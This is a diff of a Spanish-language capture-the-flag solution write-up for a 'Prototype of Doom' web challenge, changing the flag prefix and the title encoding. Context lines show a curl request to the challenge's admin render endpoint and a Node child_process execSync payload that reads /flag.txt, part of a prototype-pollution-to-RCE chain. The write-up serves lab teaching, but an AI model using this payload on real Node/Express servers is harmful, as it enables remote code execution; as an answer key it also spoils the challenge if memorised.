@@ -1,4 +1,4 @@
-# Solución — web-proto-03 · Prototype of Doom
+﻿# Solución — web-proto-03 · Prototype of Doom
 
 **Categoría:** web · **Dificultad:** insane · **Vuln central:** **Prototype
 Pollution** (Node/Express) encadenada a **bypass de autorización** + **RCE en
@@ -101,7 +101,7 @@ curl -s -X POST http://<host>:8080/api/templates/save \
 ```bash
 curl -s -X POST http://<host>:8080/admin/render \
   -H 'Content-Type: application/json' -d '{"template":"[doom]"}'
-# -> {"rendered":"flag{...}\n[doom]"}
+# -> {"rendered":"HL4{...}\n[doom]"}
 ```
 
 `process.mainModule.require('child_process').execSync('cat /flag.txt')` es
@@ -110,7 +110,7 @@ equivalente y también funciona (RCE plena, no solo lectura de archivo).
 **Exploit automatizado:** `python solution/exploit.py http://<host>:8080`.
 
 Verificado localmente (Node 20, EJS 3.1.6): la cadena devuelve
-`{"rendered":"flag{...}[doom]"}` con la flag del env / `/flag.txt`.
+`{"rendered":"HL4{...}[doom]"}` con la flag del env / `/flag.txt`.
 
 ## Por qué es INSANE
 
